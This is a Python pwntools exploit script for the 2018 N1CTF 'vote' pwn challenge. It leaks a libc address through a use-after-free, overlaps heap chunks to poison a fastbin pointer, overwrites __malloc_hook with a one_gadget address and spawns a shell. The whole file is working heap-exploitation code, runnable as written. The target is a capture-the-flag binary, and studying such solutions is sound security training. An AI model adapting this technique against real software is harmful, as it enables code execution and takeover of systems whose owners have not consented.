from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./2018_N1ctf_vote")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./2018_N1ctf_vote")
else:
	pass

def add(size,content):
	p.sendlineafter("Action: ","0")
	p.sendlineafter("size: ",str(size))
	p.sendlineafter("name: ",content)

def show(index):
	p.sendlineafter("Action: ","1")
	p.sendlineafter("index: ",str(index))
	
def vote(index):
	p.sendlineafter("Action: ","2")
	p.sendlineafter("index: ",str(index))

def result():
	p.sendlineafter("Action: ","3")

def cancel(index):
	p.sendlineafter("Action: ","4")
	p.sendlineafter("index: ",str(index))

def debugf():
	gdb.attach(p,"b *0x40126B\nb free")

context.log_level = "debug"
context.terminal = ["tmux","splitw","-v"]
debugf()

# leak libc
add(0x100,"a") #0
add(0x100,"b") #1
add(0x100,"c") #2
cancel(1)
show(1)
p.recvuntil("count: ")
leak_addr = int(p.recvuntil("\n",drop = True),10)
libc.address = leak_addr - 88 - 0x10 - libc.symbols["__malloc_hook"]
log.success("libc_base:"+hex(libc.address))

# edit the fd in 0
cancel(0)
payload = "a" * 0x100 + p64(0) + p64(0x71) + p64(0) * (0x60/8) + p64(0) + p64(0x51)
add(0x120 * 2 - 0x20,payload)
cancel(1)
cancel(0)
payload = "a" * 0x100 + p64(0) + p64(0x71) + p64(libc.symbols["__malloc_hook"] - 0x23)
add(0x120 * 2 - 0x20,payload)
add(0x50,"a")
one_gadget = libc.address + 0xf1147
payload = "aaa" + p64(one_gadget)
add(0x50,payload)
p.sendlineafter("Action: ","0")
p.sendlineafter("size: ",str(0x10))
p.interactive()
